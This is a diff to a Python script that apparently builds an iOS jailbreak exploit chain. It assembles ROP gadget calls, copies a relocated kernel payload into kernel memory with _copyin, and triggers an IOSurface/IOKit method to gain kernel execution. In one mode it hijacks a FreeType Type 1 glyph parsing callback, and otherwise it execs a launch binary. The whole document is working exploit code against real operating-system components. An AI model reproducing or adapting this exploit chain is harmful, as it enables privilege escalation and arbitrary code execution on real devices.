@@ -32,14 +32,14 @@ def dbg_result():
         back = sys._getframe().f_back
         funcall('_printf', ptr('Result for %s:%d was %%08x\n' % (back.f_code.co_filename, back.f_lineno), True), result)
 
+dmini.init(cachefile, True)
 
 dmini.init(kernfile, False)
 
 code_addr = 0x80000400 # XXX
-weirdfile = dmini.Connection('kcode.o', rw=True).relocate(dmini.cur, code_addr).nth_segment(0)[:-8]
+weirdfile = dmini.Connection('kcode.o', rw=True).relocate(dmini.cur, code_addr).nth_segment(0)[:-4]
 count = 0
 stuff = ''
-kreturn = pointed('')
 while True:
     namelen = patchfp.read(4)
     if len(namelen) == 0: break
@@ -51,7 +51,7 @@ while True:
         continue
     stuff += I(addr, len(data)) + data
     count += 1
-weirdfile = pointed(weirdfile + I(count, pointer(kreturn)) + stuff)
+weirdfile = pointed(weirdfile + I(count) + stuff)
 init('R4', 'R5', 'R6', 'R7', 'PC', pic=True)
 funcall('_copyin', pointer(weirdfile), code_addr, len(weirdfile))
 set_fwd('PC', code_addr)
@@ -91,11 +91,10 @@ if mode == 'dejavu':
 if mode == 'dejavu' and four_dot_three:
     p_1000, _1000 = stackunkpair()
     p_100c, _100c = stackunkpair()
-    funcall('_dyld_get_image_header', 0)
+    funcall('__dyld_get_image_header', 0)
     store_r0_to(p_1000)
     add_r0_by(0xc)
     store_r0_to(p_100c)
-
 else:
     p_1000 = ptrI(0x1000)
     _1000 = 0x1000
@@ -121,8 +120,9 @@ if mode == 'dejavu':
     funcall('_munmap', p_1000, 0x1000, load_r0=True); dbg_result()
     funcall('_mmap', p_1000, 0x1000, 3, 0x1001, 0, load_r0=True); dbg_result()
 
-funcall('_memcpy', p_1000, ptr(kstuff), len(kstuff), load_r0=True)
 funcall('_mlock', p_1000, 0x1000, load_r0=True); dbg_result()
+memcpy = '_memcpy$VARIANT$CortexA8' if four_dot_three else '_memcpy'
+funcall(memcpy, p_1000, ptr(kstuff), len(kstuff), load_r0=True)
 
 funcall('iosurface._IOSurfaceWrapClientImage', 1, _100c, 0x41424752, 4, 0x40000, 0);
 if mode == 'dejavu':
@@ -143,14 +143,10 @@ funcall('iokit._IOServiceGetMatchingService', 0, matching)
 connect = ptrI(0)
 funcall('iokit._IOServiceOpen', None, task_self, 0, connect); dbg_result()
 
+dbg_result(); funcall('_abort')
+
 js = ptrI(surface_id, 0, 9 if four_dot_three else 8, 0)
 funcall('iokit._IOConnectCallScalarMethod', connect, 1, js, 2, 0, 0, load_r0=True)
-
-clear_fwd() # we're not coming back the usual way
-heapadd(kreturn, fwd('PC'))
-fwd('R7')
-set_sp_to_sp()
-make_avail()
 
 # do some housekeeping
 # (but don't bother if we're going to exec)
@@ -197,7 +193,8 @@ if mode == 'dejavu':
     set_r0_to(1337)
     fancy_set_sp_to(reloc(0xe, 0x60c)) # offset determined by experiment
 else:
-    funcall('_execl', ptr('/sbin/lunchd', True), 0)
+    lunchd = ptr('/sbin/lunchd', True)
+    funcall('_execl', lunchd, lunchd, 0)
 
 goo.sheap.append(pad(weirdfile, 4))
 
@@ -207,7 +204,6 @@ if mode == 'dejavu':
 
     # add sp, #400; pop {r4, r5, pc}
     parse_callback = dmini.cur.find_basic('+ 64 b0 30 bd').value
-    print hex(parse_callback)
     actual_parse_callback = dmini.cur.private_sym('ft._T1_Parse_Glyph').value
 
     final = final.unpack()
